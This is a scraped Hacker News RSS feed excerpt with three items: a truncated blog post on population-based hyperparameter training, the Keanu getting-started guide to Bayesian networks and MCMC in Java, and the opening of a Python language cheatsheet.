<p>Assuming the optimization technique would gives us good $\theta$ for $\hat{Q}(\theta | h)$, sometimes it could even be he the optimal parameters $\theta^{\ast}_{\hat{Q}(\theta|h)}$, how do we tune hyperparameters $h$ such that $Q(\theta)$ is as close to $Q(\theta^{\ast}_{Q(\theta)})$ as possible? Population based training, using the evolution of hyperparameters, is trying to solve this problem.</p>

<h3 id="population-based-training">Population Based Training</h3>

<p>Before we discuss the population based training, we would like to briefly review how people typically do hyperparameter tuning.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-06-28-Population-Based-Training/hyperparameter-tuning-paradigm.png">
    <figcaption>Hyperparameter Tuning Approaches</figcaption>
</figure>
</div>

<p>The sequential hyperparameter tuning approach is the most tedious for human beings but uses the least computation resources. We use one set of hyperparameters to train and evaluate the model. Based on the evaluation, we tune the hyperparameter and start the next round of training. We only runs one training instance throughout the entire tuning process but it could take a long time to find a good model that we feel satisfied with.</p>



<p>The parallel hyperparameter tuning approach is computation resource constrained. We run many training instances for different hyperparameters asynchronously, and find the best hyperparameters that gives the best evaluations. This approach, in my opinion, could hardly be called as “tuning”, since there is actually no tuning at all. The number of training instances we could run and the number of hyperparameters we would explore are solely dependent on how much computation resources we have and how much computation resource one training instance takes.</p>



<p>The population based hyperparameter tuning approach is a combination of the sequential approach and the parallel approach, with the human intervention in the sequential approach replaced with an automation from genetic algorithm. We run many training instance asynchronously with different hyperparameters $h_0$, and each training instance is updating the model parameters $\theta$ iteratively. At some point during the training, we compare the performances of all the training instances, and find out the one with the best performance. The rest of the training instances would start to use the exact same model parameters $\theta$ and the hyperparameters $h$ that the best training instance uses, which is called “exploitation”. Then, the hyperparameters $h$ for all the training instance other than the best training instance would be subject to some mutations, which is called “exploration”. In particular, “exploitation” means using the best configurations that the best training instance uses for all the training instances, “exploration” means mutating the hyperparameters for all the training instances other than the best training instance. The idea of population based training is simple and should be extremely familiar to the people who have experiences working with genetic algorithms.</p>

<h3 id="population-based-training-example">Population Based Training Example</h3>

<p>The DeepMind authors prepared a simple example to illustrate how the population based hyperparameter tuning approach is different from the other hyperparameter tuning approaches, such as grid search, given the same amount of computation resources.</p>



<p>In this particular setting, the evaluation objective is to maximize</p>



<p>where $\theta_0$ and $\theta_1$ are model parameters. The evaluation objective is treated as a black-box which we throw in $\theta_0$ and $\theta_1$ and generates a score. The maximum evaluation score it could achieve is $1.2$ when $\theta_0 = 0$ and $\theta_0 = 1$.</p>



<p>The surrogate objective we proposed is to maximize</p>



<p>where $h_0$ and $h_1$ are hyperparameters. We would use gradient ascent iteratively, with a fixed learning rate $\eta$, to optimize this surrogate objective, given the hyperparameters $h_0$ and $h_1$ and initial parameters $\theta_0$ and $\theta_1$.</p>



<p>Lucky us, the surrogate objective is very close to the black-box evaluation objective. If somehow we could be more lucky and use hyperparameters $h_0=1$ and $h_1=1$, optimizing surrogate objective would be equivalent to optimizing the evaluation objective, and we would be the most likely to have the maximum evaluation score.</p>



<p>We were given computation resources that allows running two training instances simultaneously. This time, we are not extremely lucky again. We used $\{h_0=1, h_1=0\}$ and $\{h_0=0, h_1=1\}$ as the initial hyperparameters for the two training instances, respectively. We want to check which hyperparameter tuning approach results in the best evaluation score, given the same amount of computation resources.</p>



<p>To make it “fair”, the model should be initialized with parameters $\theta_0=0.9$ and $\theta_1=0.9$, and each training instance is only allowed to use gradient ascent to update the hyperparameter $40$ times. The author did not mention what learning rate $\eta$ to use, but is the same for all training instances in all hyperparameter tuning approaches.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-06-28-Population-Based-Training/pbt-example.png">
    <figcaption>Population Based Training Example</figcaption>
</figure>
</div>

<p>The DeepMind authors created contour plots to make it easy to understand. The lighter the region is in the plot, the higher the evaluation score is. One training instance is denoted using black nodes, where each node represents the model parameters for each update iteration. The other training instance is denoted using red nodes. There are $2 \times 40 = 80$ nodes in total in one contour plot.</p>



<p>For grid search, because there is no actual hyperparameter tuning during training, $h_0$ and $h_1$ remain the same for the two training instances and the evaluation score is much lower than the possible …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://leimao.github.io/blog/Population-Based-Training/">https://leimao.github.io/blog/Population-Based-Training/</a></em></p>]]>
            </description>
            <link>https://leimao.github.io/blog/Population-Based-Training/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739659</guid>
            <pubDate>Sun, 05 Jul 2020 16:04:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Keanu: Probabilistic programming with Bayesian network models]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739643">thread link</a>) | @memexy
<br/>
July 5, 2020 | https://improbable-research.github.io/keanu/docs/getting-started/ | <a href="https://web.archive.org/web/*/https://improbable-research.github.io/keanu/docs/getting-started/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<div>
							<h2 id="your-model-as-a-bayesian-network">Your model as a Bayesian Network</h2>

<p>You need to describe your model to Keanu as a Bayesian network. A network is built from vertices. 
Vertices represent variables, which may be random or deterministic, and edges represent dependencies between variables. 
Your model’s state (i.e. data) is housed in these vertices as the vertex’s <code>value</code>. 
The value of a vertex can depend on the value of a parent vertex and can be updated in one of
two ways.</p>

<p>Let’s look at an example of two vertices A and B that contain some numbers as their values. Numbers from A and B are 
added together, which yields C.</p>



<p>If the number in A changes then the number in C will change as well and likewise for changes from B.</p>

<p>You can describe this in Keanu as:</p>

<div><div><pre><code><span>DoubleVertex</span> <span>A</span> <span>=</span> <span>new</span> <span>GaussianVertex</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>);</span>
<span>DoubleVertex</span> <span>B</span> <span>=</span> <span>new</span> <span>GaussianVertex</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>);</span>
<span>DoubleVertex</span> <span>C</span> <span>=</span> <span>A</span><span>.</span><span>plus</span><span>(</span><span>B</span><span>);</span>
</code></pre></div></div>

<h3 id="propagating-changes-forward">Propagating changes forward</h3>

<p>If you change A, you can tell C to recalculate based off of A’s new value and B’s unchanged value. 
To do this:</p>



<h3 id="evaluating-upstream-changes">Evaluating upstream changes</h3>

<p>But if you want to change both A and B then you probably don’t want to have C update twice. In that
case you would prefer to calculate C after both and A and B have changed and therefore calculating 
C once. This can be done by:</p>

<div><div><pre><code><span>A</span><span>.</span><span>setValue</span><span>(</span><span>1.234</span><span>);</span>
<span>B</span><span>.</span><span>setValue</span><span>(</span><span>4.321</span><span>);</span>
<span>C</span><span>.</span><span>lazyEval</span><span>();</span>
</code></pre></div></div>

<p>or</p>

<div><div><pre><code><span>A</span><span>.</span><span>setValue</span><span>(</span><span>1.234</span><span>);</span>
<span>B</span><span>.</span><span>setValue</span><span>(</span><span>4.321</span><span>);</span>
<span>VertexValuePropagation</span><span>.</span><span>cascadeUpdate</span><span>(</span><span>A</span><span>,</span> <span>B</span><span>);</span>
</code></pre></div></div>

<h3 id="observing-a-value">Observing a value</h3>

<p>Another central concept to Bayesian networks is observations. The value of a vertex can be “observed”, which
effectively locks the value of the vertex. Observing a vertex raises a flag on the vertex that tells an
inference algorithm to treat the vertex in a special way.</p>

<p>Observing vertices that contain numbers is a special case and is described more in the docs on <a href="https://improbable-research.github.io/keanu/docs/vertex-summary">Double vertices</a>.
In the interest of keeping this simple, take for example the case where instead of multiplying A and B, we apply the logical AND operator to their values.</p>

<div><div><pre><code>(A) _
     \
     AND -&gt; (C)
(B) _/
</code></pre></div></div>

<p>In this example, A and B contain boolean values and C is true only if both A and B are true. To describe this network in Keanu:</p>

<div><div><pre><code><span>BooleanVertex</span> <span>A</span> <span>=</span> <span>new</span> <span>BernoulliVertex</span><span>(</span><span>0.5</span><span>);</span>
<span>BooleanVertex</span> <span>B</span> <span>=</span> <span>new</span> <span>BernoulliVertex</span><span>(</span><span>0.5</span><span>);</span>
<span>BooleanVertex</span> <span>C</span> <span>=</span> <span>A</span><span>.</span><span>and</span><span>(</span><span>B</span><span>);</span>
</code></pre></div></div>

<p>To observe that C is true:</p>



<p>Now you can infer that A and B are also both true by sampling from the posterior distribution. Note: we will be covering MCMC sampling in the <a href="https://improbable-research.github.io/keanu/docs/inference-posterior-sampling/">Posterior Sampling</a> section.</p>

<div><div><pre><code><span>A</span><span>.</span><span>observe</span><span>(</span><span>true</span><span>);</span>
<span>B</span><span>.</span><span>observe</span><span>(</span><span>true</span><span>);</span>

<span>KeanuProbabilisticModel</span> <span>model</span> <span>=</span> <span>new</span> <span>KeanuProbabilisticModel</span><span>(</span><span>C</span><span>.</span><span>getConnectedGraph</span><span>());</span>
<span>NetworkSamples</span> <span>posteriorSamples</span> <span>=</span> <span>Keanu</span><span>.</span><span>Sampling</span><span>.</span><span>MetropolisHastings</span><span>.</span><span>withDefaultConfig</span><span>().</span><span>getPosteriorSamples</span><span>(</span>
    <span>model</span><span>,</span>
    <span>Arrays</span><span>.</span><span>asList</span><span>(</span><span>A</span><span>,</span> <span>B</span><span>),</span>
    <span>100000</span>
<span>).</span><span>drop</span><span>(</span><span>10000</span><span>).</span><span>downSample</span><span>(</span><span>2</span><span>);</span>
<span>double</span> <span>probabilityOfA</span> <span>=</span> <span>posteriorSamples</span><span>.</span><span>get</span><span>(</span><span>A</span><span>).</span><span>probability</span><span>(</span><span>isTrue</span> <span>-&gt;</span> <span>isTrue</span><span>.</span><span>scalar</span><span>()</span> <span>==</span> <span>true</span><span>);</span>
<span>//probabilityOfA evaluates to 1.0</span>
</code></pre></div></div>
<p><strong>You may be wondering why we go to all the hassle of doing inference</strong> rather than just writing something like the following:</p>
<div><div><pre><code><span>//WRONG</span>
<span>A</span><span>.</span><span>lazyEval</span><span>();</span>
<span>B</span><span>.</span><span>lazyEval</span><span>();</span>
<span>System</span><span>.</span><span>out</span><span>.</span><span>println</span><span>(</span><span>A</span><span>.</span><span>getValue</span><span>().</span><span>scalar</span><span>());</span>
</code></pre></div></div>
<p>The issue here is that A and B are vertices in the computation graph that describes our prior and taking the value from A and B will just return a random value as if the BernoulliVertex was referenced in isolation. 
In this very contrived example it seems obvious to us how the value of C should propagate values to A and B but this is not always so straightforward.
In general, this process is known as <em>variable elimination</em> and it is not supported by Keanu. 
Therefore, in order to infer the values of A and B, you have to perform inference using a posterior sampling algorithm like <a href="https://improbable-research.github.io/keanu/docs/inference-posterior-sampling/">MCMC</a>.</p>

<p><strong>You may also be wondering why we also observe A and B to be true</strong> in the above code. 
This is so that when our sampling algorithm (MCMC) starts to sample from the posterior, it will start from a network with a probability that is non-zero.
If we do not include this, then our network will get a random starting value, e.g. A is false and B is true, and then will discover that it is actually not possible to be in this state and will throw an error.</p>

<p>In general, A and B are known as <em>latent variables</em> because we do not directly observe them. In more complex cases, we may not know what starting state (like A: true, B: true in this case) to use. 
There are a couple of techniques that solve this problem so that we can leverage Bayesian Inference.
Firstly, you might choose to use the <code>ParticleFilter</code> class in order to find the most probable state to start your algorithm from.
Alternatively, you can create a new Bayesian network and use this to probe some random configurations a certain number of times to see if it can find a possible one.</p>
<div><div><pre><code><span>BayesianNetwork</span> <span>bayesianNetwork</span> <span>=</span> <span>new</span> <span>BayesianNetwork</span><span>(</span><span>C</span><span>.</span><span>getConnectedGraph</span><span>());</span>
<span>bayesianNetwork</span><span>.</span><span>probeForNonZeroProbability</span><span>(</span><span>10</span><span>);</span>
</code></pre></div></div>
<p>Now you can run MCMC on the BayesNet as it will start off in the correct configuration.</p>

<p>Instead of running MCMC you could also run one of our <a href="https://improbable-research.github.io/keanu/docs/inference-map">inference algorithms</a>.</p>

						</div><!-- /.content -->
					</div></div>]]>
            </description>
            <link>https://improbable-research.github.io/keanu/docs/getting-started/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739643</guid>
            <pubDate>Sun, 05 Jul 2020 16:01:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best Python Reference Ever]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739589">thread link</a>) | @pizzaburek
<br/>
July 5, 2020 | https://gto76.github.io/python-cheatsheet | <a href="https://web.archive.org/web/*/https://gto76.github.io/python-cheatsheet">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <header>
    
    
  </header>

  <span><i></i></span>
   <div><br><div><h2 id="toc"><a href="#toc" name="toc">#</a>Contents</h2><pre><code><strong>ToC</strong> = {
    <strong><span><span>'1. Collections'</span></span></strong>: [<a href="#list">List</a>, <a href="#dictionary">Dictionary</a>, <a href="#set">Set</a>, <a href="#tuple">Tuple</a>, <a href="#range">Range</a>, <a href="#enumerate">Enumerate</a>, <a href="#iterator">Iterator</a>, <a href="#generator">Generator</a>],
    <strong><span><span>'2. Types'</span></span></strong>:       [<a href="#type">Type</a>, <a href="#string">String</a>, <a href="#regex">Regular_Exp</a>, <a href="#format">Format</a>, <a href="#numbers">Numbers</a>, <a href="#combinatorics">Combinatorics</a>, <a href="#datetime">Datetime</a>],
    <strong><span><span>'3. Syntax'</span></span></strong>:      [<a href="#arguments">Args</a>, <a href="#inline">Inline</a>, <a href="#closure">Closure</a>, <a href="#decorator">Decorator</a>, <a href="#class">Class</a>, <a href="#ducktypes">Duck_Type</a>, <a href="#enum">Enum</a>, <a href="#exceptions">Exception</a>],
    <strong><span><span>'4. System'</span></span></strong>:      [<a href="#exit">Exit</a>, <a href="#print">Print</a>, <a href="#input">Input</a>, <a href="#commandlinearguments">Command_Line_Arguments</a>, <a href="#open">Open</a>, <a href="#path">Path</a>, <a href="#oscommands">OS_Commands</a>],
    <strong><span><span>'5. Data'</span></span></strong>:        [<a href="#json">JSON</a>, <a href="#pickle">Pickle</a>, <a href="#csv">CSV</a>, <a href="#sqlite">SQLite</a>, <a href="#bytes">Bytes</a>, <a href="#struct">Struct</a>, <a href="#array">Array</a>, <a href="#memoryview">Memory_View</a>, <a href="#deque">Deque</a>],
    <strong><span><span>'6. Advanced'</span></span></strong>:    [<a href="#threading">Threading</a>, <a href="#operator">Operator</a>, <a href="#introspection">Introspection</a>, <a href="#metaprograming">Metaprograming</a>, <a href="#eval">Eval</a>, <a href="#coroutines">Coroutine</a>],
    <strong><span><span>'7. Libraries'</span></span></strong>:   [<a href="#progressbar">Progress_Bar</a>, <a href="#plot">Plot</a>, <a href="#table">Table</a>, <a href="#curses">Curses</a>, <a href="#logging">Logging</a>, <a href="#scraping">Scraping</a>, <a href="#web">Web</a>, <a href="#profiling">Profile</a>,
                       <a href="#numpy">NumPy</a>, <a href="#image">Image</a>, <a href="#audio">Audio</a>, <a href="#pygame">Games</a>, <a href="#pandas">Data</a>, <a href="#cython">Cython</a>]
}
</code></pre></div></div>






<div><h2 id="main"><a href="#main" name="main">#</a>Main</h2><pre><code><span>if</span> __name__ == <span>'__main__'</span>:     
    main()
</code></pre></div>

<div><h2 id="list"><a href="#list" name="list">#</a>List</h2><pre><code>&lt;list&gt; = &lt;list&gt;[from_inclusive : to_exclusive : ±step_size]
</code></pre></div>

<pre><code>&lt;list&gt;.append(&lt;el&gt;)            
&lt;list&gt;.extend(&lt;collection&gt;)    
</code></pre>
<pre><code>&lt;list&gt;.sort()
&lt;list&gt;.reverse()
&lt;list&gt; = sorted(&lt;collection&gt;)
&lt;iter&gt; = reversed(&lt;list&gt;)
</code></pre>
<pre><code>sum_of_elements  = sum(&lt;collection&gt;)
elementwise_sum  = [sum(pair) <span>for</span> pair <span>in</span> zip(list_a, list_b)]
sorted_by_second = sorted(&lt;collection&gt;, key=<span>lambda</span> el: el[<span>1</span>])
sorted_by_both   = sorted(&lt;collection&gt;, key=<span>lambda</span> el: (el[<span>1</span>], el[<span>0</span>]))
flatter_list     = list(itertools.chain.from_iterable(&lt;list&gt;))
product_of_elems = functools.reduce(<span>lambda</span> out, el: out * el, &lt;collection&gt;)
list_of_chars    = list(&lt;str&gt;)
</code></pre>
<ul>
<li><strong>Module <a href="#operator">operator</a> provides functions itemgetter() and mul() that offer the same functionality as <a href="#lambda">lambda</a> expressions above.</strong></li>
</ul>
<pre><code>&lt;int&gt; = &lt;list&gt;.count(&lt;el&gt;)     
index = &lt;list&gt;.index(&lt;el&gt;)     
&lt;list&gt;.insert(index, &lt;el&gt;)     
&lt;el&gt; = &lt;list&gt;.pop([index])     
&lt;list&gt;.remove(&lt;el&gt;)            
&lt;list&gt;.clear()                 
</code></pre>
<div><h2 id="dictionary"><a href="#dictionary" name="dictionary">#</a>Dictionary</h2><pre><code>&lt;view&gt; = &lt;dict&gt;.keys()                          
&lt;view&gt; = &lt;dict&gt;.values()                        
&lt;view&gt; = &lt;dict&gt;.items()                         
</code></pre></div>

<pre><code>value  = &lt;dict&gt;.get(key, default=<span>None</span>)          
value  = &lt;dict&gt;.setdefault(key, default=<span>None</span>)   
&lt;dict&gt; = collections.defaultdict(&lt;type&gt;)        
&lt;dict&gt; = collections.defaultdict(<span>lambda</span>: <span>1</span>)     
</code></pre>
<pre><code>&lt;dict&gt; = dict(&lt;collection&gt;)                     
&lt;dict&gt; = dict(zip(keys, values))                
&lt;dict&gt; = dict.fromkeys(keys [, value])          
</code></pre>
<pre><code>&lt;dict&gt;.update(&lt;dict&gt;)                           
value = &lt;dict&gt;.pop(key)                         
{k <span>for</span> k, v <span>in</span> &lt;dict&gt;.items() <span>if</span> v == value}    
{k: v <span>for</span> k, v <span>in</span> &lt;dict&gt;.items() <span>if</span> k <span>in</span> keys}  
</code></pre>
<div><h3 id="counter">Counter</h3><pre><code><span>&gt;&gt;&gt; </span><span>from</span> collections <span>import</span> Counter
<span>&gt;&gt;&gt; </span>colors = [<span>'blue'</span>, <span>'blue'</span>, <span>'blue'</span>, <span>'red'</span>, <span>'red'</span>]
<span>&gt;&gt;&gt; </span>counter = Counter(colors)
<span>&gt;&gt;&gt; </span>counter[<span>'yellow'</span>] += <span>1</span>
Counter({<span>'blue'</span>: <span>3</span>, <span>'red'</span>: <span>2</span>, <span>'yellow'</span>: <span>1</span>})
<span>&gt;&gt;&gt; </span>counter.most_common()[<span>0</span>]
(<span>'blue'</span>, <span>3</span>)
</code></pre></div>



<pre><code>&lt;set&gt;.add(&lt;el&gt;)                                 
&lt;set&gt;.update(&lt;collection&gt;)                      
</code></pre>
<pre><code>&lt;set&gt;  = &lt;set&gt;.union(&lt;coll.&gt;)                   
&lt;set&gt;  = &lt;set&gt;.intersection(&lt;coll.&gt;)            
&lt;set&gt;  = &lt;set&gt;.difference(&lt;coll.&gt;)              
&lt;set&gt;  = &lt;set&gt;.symmetric_difference(&lt;coll.&gt;)    
&lt;bool&gt; = &lt;set&gt;.issubset(&lt;coll.&gt;)                
&lt;bool&gt; = &lt;set&gt;.issuperset(&lt;coll.&gt;)              
</code></pre>
<pre><code>&lt;el&gt; = &lt;set&gt;.pop()                              
&lt;set&gt;.remove(&lt;el&gt;)                              
&lt;set&gt;.discard(&lt;el&gt;)                             
</code></pre>
<div><h3 id="frozenset">Frozen Set</h3><ul>
<li><strong>Is immutable and hashable.</strong></li>
<li><strong>That means it can be used as a key in a dictionary or as an element in a set.</strong></li>
</ul><pre><code>&lt;frozenset&gt; = frozenset(&lt;collection&gt;)
</code></pre></div>


<div><h2 id="tuple"><a href="#tuple" name="tuple">#</a>Tuple</h2><p><strong>Tuple is an immutable and hashable list.</strong></p><pre><code>&lt;tuple&gt; = ()
&lt;tuple&gt; = (&lt;el&gt;, )
&lt;tuple&gt; = (&lt;el_1&gt;, &lt;el_2&gt; [, ...])
</code></pre></div>


<div><h3 id="namedtuple">Named Tuple</h3><p><strong>Tuple's subclass with named elements.</strong></p><pre><code><span>&gt;&gt;&gt; </span><span>from</span> collections <span>import</span> namedtuple
<span>&gt;&gt;&gt; </span>Point = namedtuple(<span>'Point'</span>, <span>'x y'</span>)
<span>&gt;&gt;&gt; </span>p = Point(<span>1</span>, y=<span>2</span>)
Point(x=<span>1</span>, y=<span>2</span>)
<span>&gt;&gt;&gt; </span>p[<span>0</span>]
<span>1</span>
<span>&gt;&gt;&gt; </span>p.x
<span>1</span>
<span>&gt;&gt;&gt; </span>getattr(p, <span>'y'</span>)
<span>2</span>
<span>&gt;&gt;&gt; </span>p._fields  
(<span>'x'</span>, <span>'y'</span>)
</code></pre></div>


<div><h2 id="range"><a href="#range" name="range">#</a>Range</h2><pre><code>&lt;range&gt; = range(to_exclusive)
&lt;range&gt; = range(from_inclusive, to_exclusive)
&lt;range&gt; = range(from_inclusive, to_exclusive, ±step_size)
</code></pre></div>

<pre><code>from_inclusive = &lt;range&gt;.start
to_exclusive   = &lt;range&gt;.stop
</code></pre>
<div><h2 id="enumerate"><a href="#enumerate" name="enumerate">#</a>Enumerate</h2><pre><code><span>for</span> i, el <span>in</span> enumerate(&lt;collection&gt; [, i_start]):
    ...
</code></pre></div>

<div><h2 id="iterator"><a href="#iterator" name="iterator">#</a>Iterator</h2><pre><code>&lt;iter&gt; = iter(&lt;collection&gt;)                 
&lt;iter&gt; = iter(&lt;function&gt;, to_exclusive)     
&lt;el&gt;   = next(&lt;iter&gt; [, default])           
&lt;list&gt; = list(&lt;iter&gt;)                       
</code></pre></div>

<div><h3 id="itertools">Itertools</h3><pre><code><span>from</span> itertools <span>import</span> count, repeat, cycle, chain, islice
</code></pre></div>

<pre><code>&lt;iter&gt; = count(start=<span>0</span>, step=<span>1</span>)             
&lt;iter&gt; = repeat(&lt;el&gt; [, times])             
&lt;iter&gt; = cycle(&lt;collection&gt;)                
</code></pre>
<pre><code>&lt;iter&gt; = chain(&lt;coll_1&gt;, &lt;coll_2&gt; [, ...])  
&lt;iter&gt; = chain.from_iterable(&lt;collection&gt;)  
</code></pre>
<pre><code>&lt;iter&gt; = islice(&lt;collection&gt;, to_exclusive)
&lt;iter&gt; = islice(&lt;collection&gt;, from_inclusive, to_exclusive [, +step_size])
</code></pre>
<div><h2 id="generator"><a href="#generator" name="generator">#</a>Generator</h2><ul>
<li><strong>Any function that contains a yield statement returns a generator.</strong></li>
<li><strong>Generators and iterators are interchangeable.</strong></li>
</ul><pre><code><span><span>def</span> <span>count</span><span>(start, step)</span>:</span>
    <span>while</span> <span>True</span>:
        <span>yield</span> start
        start += step
</code></pre></div>


<pre><code><span>&gt;&gt;&gt; </span>counter = count(<span>10</span>, <span>2</span>)
<span>&gt;&gt;&gt; </span>next(counter), next(counter), next(counter)
(<span>10</span>, <span>12</span>, <span>14</span>)
</code></pre>
<div><h2 id="type"><a href="#type" name="type">#</a>Type</h2><ul>
<li><strong>Everything is an object.</strong></li>
<li><strong>Every object has a type.</strong></li>
<li><strong>Type and class are synonymous.</strong></li>
</ul><pre><code>&lt;type&gt; = type(&lt;el&gt;)                          
&lt;bool&gt; = isinstance(&lt;el&gt;, &lt;type&gt;)            
</code></pre></div>


<pre><code><span>&gt;&gt;&gt; </span>type(<span>'a'</span>), <span>'a'</span>.__class__, str
(&lt;<span><span>class</span> '<span>str</span>'&gt;, &lt;<span>class</span> '<span>str</span>'&gt;, &lt;<span>class</span> '<span>str</span>'&gt;)
</span></code></pre>
<div><h4 id="sometypesdonothavebuiltinnamessotheymustbeimported">Some types do not have built-in names, so they must be imported:</h4><pre><code><span>from</span> types <span>import</span> FunctionType, MethodType, LambdaType, GeneratorType
</code></pre></div>

<div><h3 id="abstractbaseclasses">Abstract Base Classes</h3><p><strong>Each abstract base class specifies a set of virtual subclasses. These classes are then recognized by isinstance() and issubclass() as subclasses of the ABC, although they are really not.</strong></p><pre><code><span>&gt;&gt;&gt; </span><span>from</span> collections.abc <span>import</span> Sequence, Collection, Iterable
<span>&gt;&gt;&gt; </span>isinstance([<span>1</span>, <span>2</span>, <span>3</span>], Iterable)
<span>True</span>
</code></pre></div>


<pre><code>┏━━━━━━━━━━━━━━━━━━┯━━━━━━━━━━━━┯━━━━━━━━━━━━┯━━━━━━━━━━━━┓
┃                  │  Sequence  │ Collection │  Iterable  ┃
┠──────────────────┼────────────┼────────────┼────────────┨
┃ list, range, str │     ✓      │     ✓      │     ✓      ┃
┃ dict, set        │            │     ✓      │     ✓      ┃
┃ iter             │            │            │     ✓      ┃
┗━━━━━━━━━━━━━━━━━━┷━━━━━━━━━━━━┷━━━━━━━━━━━━┷━━━━━━━━━━━━┛
</code></pre>
<pre><code><span>&gt;&gt;&gt; </span><span>from</span> numbers <span>import</span> Integral, Rational, Real, Complex, Number
<span>&gt;&gt;&gt; </span>isinstance(<span>123</span>, Number)
<span>True</span>
</code></pre>
<pre><code>┏━━━━━━━━━━━━━━━━━━━━┯━━━━━━━━━━┯━━━━━━━━━━┯━━━━━━━━━━┯━━━━━━━━━━┯━━━━━━━━━━┓
┃                    │ Integral │ Rational │   Real   │ Complex  │  Number  ┃
┠────────────────────┼──────────┼──────────┼──────────┼──────────┼──────────┨
┃ int                │    ✓     │    ✓     │    ✓     │    ✓     │    ✓     ┃
┃ fractions.Fraction │          │    ✓     │    ✓     │    ✓     │    ✓     ┃
┃ float              │          │          │    ✓     │    ✓     │    ✓     ┃
┃ complex            │          │          │          │    ✓     │    ✓     ┃
┃ decimal.Decimal    │          │          │          │          │    ✓     ┃
┗━━━━━━━━━━━━━━━━━━━━┷━━━━━━━━━━┷━━━━━━━━━━┷━━━━━━━━━━┷━━━━━━━━━━┷━━━━━━━━━━┛
</code></pre>
<div><h2 id="string"><a href="#string" name="string">#</a>String</h2><pre><code>&lt;str&gt;  = &lt;str&gt;.strip()                       
&lt;str&gt;  = &lt;str&gt;.strip(<span>'&lt;chars&gt;'</span>)              
</code></pre></div>

<pre><code>&lt;list&gt; = &lt;str&gt;.split()                       
&lt;list&gt; = &lt;str&gt;.split(sep=<span>None</span>, maxsplit=<span>-1</span>)  
&lt;list&gt; = &lt;str&gt;.splitlines(keepends=<span>False</span>)    
&lt;str&gt;  = &lt;str&gt;.join(&lt;coll_of_strings&gt;)       
</code></pre>
<pre><code>&lt;bool&gt; = &lt;sub_str&gt; <span>in</span> &lt;str&gt;                  
&lt;bool&gt; = &lt;str&gt;.startswith(&lt;sub_str&gt;)         
&lt;bool&gt; = &lt;str&gt;.endswith(&lt;sub_str&gt;)           
&lt;int&gt;  = &lt;str&gt;.find(&lt;sub_str&gt;)               
&lt;int&gt;  = &lt;str&gt;.index(&lt;sub_str&gt;)              
</code></pre>
<pre><code>&lt;str&gt;  = &lt;str&gt;.replace(old, new [, count])   
&lt;str&gt;  = &lt;str&gt;.translate(&lt;table&gt;)            
</code></pre>
<pre><code>&lt;str&gt;  = chr(&lt;int&gt;)                          
&lt;int&gt;  = ord(&lt;str&gt;)                          
</code></pre>
<ul>
<li><strong>Also: <code><span>'lstrip()'</span></code>, <code><span>'rstrip()'</span></code>.</strong></li>
<li><strong>Also: <code><span>'lower()'</span></code>, <code><span>'upper()'</span></code>, <code><span>'capitalize()'</span></code> and <code><span>'title()'</span></code>.</strong></li>
</ul>
<div><h3 id="propertymethods">Property Methods</h3><pre><code>┏━━━━━━━━━━━━━━━┯━━━━━━━━━━┯━━━━━━━━━━┯━━━━━━━━━━┯━━━━━━━━━━┯━━━━━━━━━━┓
┃               │ [ !#$%…] │ [a-zA-Z] │  [¼½¾]   │  [²³¹]   │  [0-9]   ┃
┠───────────────┼──────────┼──────────┼──────────┼──────────┼──────────┨
┃ isprintable() │    ✓     │    ✓     │    ✓     │    ✓     │    ✓     ┃
┃ isalnum()     │          │    ✓     │    ✓     │    ✓     │    ✓     ┃
┃ isnumeric()   │          │          │    ✓     │    ✓     │    ✓     ┃
┃ isdigit()     │          │          │          │    ✓     │    ✓     ┃
┃ isdecimal()   │          │          │          │          │    ✓     ┃
┗━━━━━━━━━━━━━━━┷━━━━━━━━━━┷━━━━━━━━━━┷━━━━━━━━━━┷━━━━━━━━━━┷━━━━━━━━━━┛
</code></pre></div>

<ul>
<li><strong>Also: <code><span>'isspace()'</span></code> checks for <code><span>'[ \t\n\r\f\v…]'</span></code>.</strong></li>
</ul>
<div><h2 id="regex"><a href="#regex" name="regex">#</a>Regex</h2><pre><code><span>import</span> re
&lt;str&gt;   = re.sub(&lt;regex&gt;, new, text, count=<span>0</span>)  
&lt;list&gt;  = re.findall(&lt;regex&gt;, text)            
&lt;list&gt;  = re.split(&lt;regex&gt;, text, maxsplit=<span>0</span>)  
&lt;Match&gt; = re.search(&lt;regex&gt;, text)             
&lt;Match&gt; = re.match(&lt;regex&gt;, text)              
&lt;iter&gt;  = re.finditer(&lt;regex&gt;, text)           
</code></pre></div>

<ul>
<li><strong>Search() and match() return None if they can't find a match.</strong></li>
<li><strong>Argument <code><span>'flags=re.IGNORECASE'</span></code> can be used with all functions.</strong></li>
<li><strong>Argument <code><span>'flags=re.MULTILINE'</span></code> makes <code><span>'^'</span></code> and <code><span>'$'</span></code> match the start/end of each line.</strong></li>
<li><strong>Argument <code><span>'flags=re.DOTALL'</span></code> makes dot also accept the <code><span>'\n'</span></code>.</strong></li>
<li><strong>Use <code><span>r'\1'</span></code> or <code><span>'\\1'</span></code> for backreference.</strong></li>
<li><strong>Add <code><span>'?'</span></code> after an operator to make it non-greedy.</strong></li>
</ul>
<div><h3 id="matchobject">Match Object</h3><pre><code>&lt;str&gt;   = &lt;Match&gt;.group()                      
&lt;str&gt;   = &lt;Match&gt;.group(<span>1</span>)                     
&lt;tuple&gt; = &lt;Match&gt;.groups()                     
&lt;int&gt;   = &lt;Match&gt;.start()                      
&lt;int&gt;   = &lt;Match&gt;.end()                        
</code></pre></div>

<div><h3 id="specialsequences">Special Sequences</h3><ul>
<li><strong>By default digits, alphanumerics and whitespaces from all alphabets are matched, unless <code><span>'flags=re.ASCII'</span></code> argument is used.</strong></li>
<li><strong>Use a capital letter for negation.</strong></li>
</ul><pre><code><span>'\d'</span> == <span>'[0-9]'</span>                                
